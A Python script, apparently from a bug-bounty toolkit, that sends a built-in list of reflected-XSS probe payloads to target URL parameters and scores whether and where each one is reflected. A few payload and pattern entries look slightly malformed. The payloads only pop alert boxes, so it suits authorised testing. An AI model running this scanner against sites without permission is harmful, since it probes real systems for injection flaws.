#!/usr/bin/env python3
import argparse
import json
import sys
import os
import re
import time
import urllib.parse
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

XSS_DETECTION_PAYLOADS = [
    {"payload": '"><svgonload=confirm(1)>', "name": "svg_onload_confirm", "detect_pattern": r'"><svgonload=confirm\(1\)>'},
    {"payload": '\'"><img src=x onerror=alert(1)>', "name": "img_onerror_alert", "detect_pattern": r"'<img src=x onerror=alert\(1\)>"},
    {"payload": '"><ScRiPt>alert(1)</ScRiPt>', "name": "case_variant_script", "detect_pattern": r"><ScRiPt>alert\(1\)</ScRiPt>"},
    {"payload": 'javascript:alert(1)', "name": "javascript_uri", "detect_pattern": r"javascript:alert\(1\)"},
    {"payload": '{{7*7}}', "name": "ssti_polyglot_xss", "detect_pattern": r"\{\{7\*7\}\}"},
    {"payload": '1;alert(1)//', "name": "js_context_break", "detect_pattern": r"1;alert\(1\)//"},
    {"payload": '`-alert(1)-`', "name": "backtick_break", "detect_pattern": r"`-alert\(1\)-`"},
    {"payload": '<body onload=alert(1)>', "name": "body_onload", "detect_pattern": r"<body onload=alert\(1\)>"},
    {"payload": '<svg/onload=alert(1)>', "name": "svg_onload_short", "detect_pattern": r"<svg/onload=alert\(1\)>"},
    {"payload": "'-alert(1)-'", "name": "single_quote_break", "detect_pattern": r"'-alert\(1\)-'"},
    {"payload": '"><iframe src=javascript:alert(1)>', "name": "iframe_js_uri", "detect_pattern": r'"><iframe src=javascript:alert\(1\)>'},
    {"payload": '<a href="javascript:alert(1)">click</a>', "name": "anchor_js_uri", "detect_pattern": r'<a href="javascript:alert\(1\)">'},
    {"payload": '"><img src=x onerror=prompt(1)>', "name": "img_prompt", "detect_pattern": r'"><img src=x onerror=prompt\(1\)>'},
    {"payload": '";alert(1);//', "name": "double_quote_break_js", "detect_pattern": r'";alert\(1\);//'},
    {"payload": '<xss id=x tabindex=1 onfocusin=alert(1)>', "name": "focusin_handler", "detect_pattern": r"<xss id=x tabindex=1 onfocusin=alert\(1\)>"},
]

CONTEXT_ATTRIBUTES = {
    "html_tag": re.compile(r'(<[^>]*>[^<]*REFLECTED)', re.IGNORECASE),
    "html_attribute_double": re.compile(r'value="REFLECTED"', re.IGNORECASE),
    "html_attribute_single": re.compile(r"value='REFLECTED'", re.IGNORECASE),
    "html_attribute_unquoted": re.compile(r'value=REFLECTED\b', re.IGNORECASE),
    "script_tag": re.compile(r'<script>[^<]*REFLECTED', re.IGNORECASE),
    "js_string_double": re.compile(r'"REFLECTED"', re.IGNORECASE),
    "js_string_single": re.compile(r"'REFLECTED'", re.IGNORECASE),
    "href_attribute": re.compile(r'href="REFLECTED"', re.IGNORECASE),
    "src_attribute": re.compile(r'src="REFLECTED"', re.IGNORECASE),
    "comment": re.compile(r'<!--.*REFLECTED.*-->', re.IGNORECASE),
    "event_handler": re.compile(r'on\w+="REFLECTED"', re.IGNORECASE),
    "style_attribute": re.compile(r'style="[^"]*REFLECTED', re.IGNORECASE),
}


def load_context(context_path):
    if not context_path or not os.path.exists(context_path):
        return {}
    try:
        with open(context_path, "r") as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError) as e:
        print(f"[warn] Failed to load context: {e}", file=sys.stderr)
        return {}


def load_urls(urls_file):
    urls = []
    if not urls_file or not os.path.exists(urls_file):
        return urls
    with open(urls_file, "r") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                urls.append(line)
    return urls


def load_params(params_file):
    params = []
    if not params_file or not os.path.exists(params_file):
        return params
    with open(params_file, "r") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                params.append(line)
    return params


def extract_params_from_url(url):
    params = set()
    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query)
    for k in query_params:
        params.add(k)
    param_pattern = re.findall(r'[?&]([\w\[\]]+)=', url)
    for p in param_pattern:
        params.add(p)
    return list(params)


def inject_payload(url, param, payload_str):
    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if param in query_params:
        query_params[param] = [payload_str]
    else:
        query_params[param] = [payload_str]
    new_query = urllib.parse.urlencode(query_params, doseq=True)
    parts = list(parsed)
    parts[4] = new_query
    return urllib.parse.urlunparse(parts)


def detect_reflection(response_text, payload_str):
    if not response_text or not payload_str:
        return False, "none", None
    escaped_payload = re.escape(payload_str)
    pattern = re.compile(escaped_payload, re.IGNORECASE)
    match = pattern.search(response_text)
    if not match:
        return False, "none", None
    ctx = "raw_in_response"
    ctx_snippet = None
    start = max(0, match.start() - 80)
    end = min(len(response_text), match.end() + 80)
    ctx_snippet = response_text[start:end]
    for ctx_name, ctx_re in CONTEXT_ATTRIBUTES.items():
        ctx_probe = ctx_re.pattern.replace("REFLECTED", re.escape(payload_str))
        ctx_compiled = re.compile(ctx_probe, re.IGNORECASE)
        if ctx_compiled.search(response_text):
            ctx = ctx_name
            break
    return True, ctx, ctx_snippet


def compute_confidence(reflected, context_type, has_special_chars):
    if not reflected:
        return 0.0
    base = 0.5
    if context_type in ("html_tag", "html_attribute_double", "html_attribute_single"):
        base = 0.9
    elif context_type in ("script_tag", "js_string_double", "js_string_single"):
        base = 0.85
    elif context_type in ("event_handler", "href_attribute", "src_attribute"):
        base = 0.8
    elif context_type in ("html_attribute_unquoted", "style_attribute"):
        base = 0.75
    elif context_type == "comment":
        base = 0.3
    if has_special_chars:
        base = min(1.0, base + 0.05)
    return round(base, 2)


def probe_single(url, param, payload_entry, session, timeout, rate_limit, dry_run):
    result = {
        "url": url,
        "param": param,
        "payload": payload_entry["payload"],
        "payload_name": payload_entry["name"],
        "reflected": False,
        "reflection_context": "none",
        "reflection_snippet": None,
        "confidence": 0.0,
        "status_code": 0,
        "response_length": 0,
        "error": None,
        "dry_run": dry_run,
    }
    if dry_run:
        test_url = inject_payload(url, param, payload_entry["payload"])
        print(f"[dry-run] Would test URL={test_url} param={param} payload={payload_entry['name']}", file=sys.stderr)
        return result
    try:
        test_url = inject_payload(url, param, payload_entry["payload"])
        start = time.time()
        resp = session.get(test_url, timeout=timeout, allow_redirects=True)
        elapsed = time.time() - start
        result["status_code"] = resp.status_code
        result["response_length"] = len(resp.text)
        reflected, ctx, snippet = detect_reflection(resp.text, payload_entry["payload"])
        result["reflected"] = reflected
        result["reflection_context"] = ctx
        result["reflection_snippet"] = snippet
        has_special = any(c in payload_entry["payload"] for c in '<>"/\'')
        result["confidence"] = compute_confidence(reflected, ctx, has_special)
        if reflected:
            print(f"[found] {url} | param={param} | ctx={ctx} | conf={result['confidence']} | payload={payload_entry['name']}", file=sys.stderr)
        if rate_limit > 0:
            time.sleep(1.0 / rate_limit)
    except requests.exceptions.Timeout:
        result["error"] = "timeout"
        print(f"[timeout] {url} param={param} payload={payload_entry['name']}", file=sys.stderr)
    except requests.exceptions.ConnectionError as e:
        result["error"] = f"connection_error: {e}"
        print(f"[conn_err] {url}: {e}", file=sys.stderr)
    except requests.exceptions.RequestException as e:
        result["error"] = str(e)
        print(f"[err] {url}: {e}", file=sys.stderr)
    return result


def main():
    parser = argparse.ArgumentParser(
        description="XSS Reflected Probe — inject XSS detection payloads and detect reflection",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --urls live_urls.txt --params params.txt --context .bb/context.json
  %(prog)s --urls live_urls.txt --context .bb/context.json --dry-run
  %(prog)s --urls single_url.txt --rate-limit 5 --timeout 10
        """,
    )
    parser.add_argument("--context", default=None, help="Path to context.json (default: .bb/context.json)")
    parser.add_argument("--urls", required=True, help="File with target URLs, one per line")
    parser.add_argument("--params", default=None, help="File with parameter names, one per line (optional; auto-extract if omitted)")
    parser.add_argument("--output", default=None, help="Output findings.jsonl path (default: <target_outdir>/xss_reflected_findings.jsonl)")
    parser.add_argument("--rate-limit", type=int, default=10, help="Max requests per second (default: 10)")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds (default: 15)")
    parser.add_argument("--concurrency", type=int, default=5, help="Thread pool concurrency (default: 5)")
    parser.add_argument("--dry-run", action="store_true", help="Print planned requests without executing")
    parser.add_argument("--payloads", default=None, help="Custom JSONL file with payload definitions")
    parser.add_argument("--user-agent", default="BugBountyAgent/2.0 (security research)", help="Custom User-Agent header")
    parser.add_argument("--proxy", default=None, help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--retries", type=int, default=2, help="Retries on failure (default: 2)")
    args = parser.parse_args()

    ctx = load_context(args.context)
    outdir = ctx.get("outdir", os.getcwd())
    evidence_dir = ctx.get("evidence_dir", os.path.join(outdir, "evidence"))
    os.makedirs(outdir, exist_ok=True)
    os.makedirs(evidence_dir, exist_ok=True)

    output_path = args.output
    if not output_path:
        output_path = os.path.join(outdir, "xss_reflected_findings.jsonl")

    urls = load_urls(args.urls)
    if not urls:
        print("[error] No URLs loaded from --urls file.", file=sys.stderr)
        sys.exit(1)

    params = load_params(args.params) if args.params else []

    payloads = XSS_DETECTION_PAYLOADS
    if args.payloads and os.path.exists(args.payloads):
        custom = []
        with open(args.payloads, "r") as f:
            for line in f:
                line = line.strip()
                if line:
                    try:
                        custom.append(json.loads(line))
                    except json.JSONDecodeError:
                        continue
        if custom:
            payloads = custom

    proxy_dict = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    session = requests.Session()
    session.headers.update({
        "User-Agent": args.user_agent,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
    })
    if proxy_dict:
        session.proxies.update(proxy_dict)
    adapter = requests.adapters.HTTPAdapter(max_retries=args.retries)
    session.mount("https://", adapter)
    session.mount("http://", adapter)

    tasks = []
    for url in urls:
        effective_params = list(params)
        if not effective_params:
            effective_params = extract_params_from_url(url)
        if not effective_params:
            effective_params = ["q", "search", "id", "page", "query", "s", "keyword", "term", "text", "name", "cat", "redirect", "url", "file", "path", "dir"]
            print(f"[info] No params in URL, using default list for {url}", file=sys.stderr)
        for param in effective_params:
            for pdef in payloads:
                tasks.append((url, param, pdef))

    print(f"[info] Prepared {len(tasks)} probe tasks across {len(urls)} URLs and {len(payloads)} payloads", file=sys.stderr)

    if args.dry_run:
        for url, param, pdef in tasks:
            probe_single(url, param, pdef, session, args.timeout, args.rate_limit, dry_run=True)
        print(f"[dry-run] Dry run complete — {len(tasks)} tasks would be executed.", file=sys.stderr)
        return

    findings = []
    completed = 0
    with open(output_path, "w") as outfile:
        with ThreadPoolExecutor(max_workers=args.concurrency) as executor:
            futures = {}
            for url, param, pdef in tasks:
                future = executor.submit(probe_single, url, param, pdef, session, args.timeout, args.rate_limit, dry_run=False)
                futures[future] = (url, param, pdef)
            for future in as_completed(futures):
                try:
                    result = future.result()
                except Exception as e:
                    print(f"[fatal] Unexpected error in worker: {e}", file=sys.stderr)
                    continue
                outfile.write(json.dumps(result) + "\n")
                completed += 1
                if result.get("reflected") and result.get("confidence", 0) > 0.3:
                    findings.append(result)
                if completed % 50 == 0:
                    print(f"[progress] {completed}/{len(tasks)} probes completed", file=sys.stderr)

    summary = {
        "total_probes": len(tasks),
        "total_completed": completed,
        "total_reflected": sum(1 for f in findings if f.get("reflected")),
        "high_confidence": sum(1 for f in findings if f.get("confidence", 0) >= 0.7),
        "medium_confidence": sum(1 for f in findings if 0.4 <= f.get("confidence", 0) < 0.7),
        "low_confidence": sum(1 for f in findings if 0 < f.get("confidence", 0) < 0.4),
        "output_path": output_path,
    }
    print(json.dumps(summary, indent=2), file=sys.stderr)
    print(f"[done] Findings written to {output_path}", file=sys.stderr)


if __name__ == "__main__":
    main()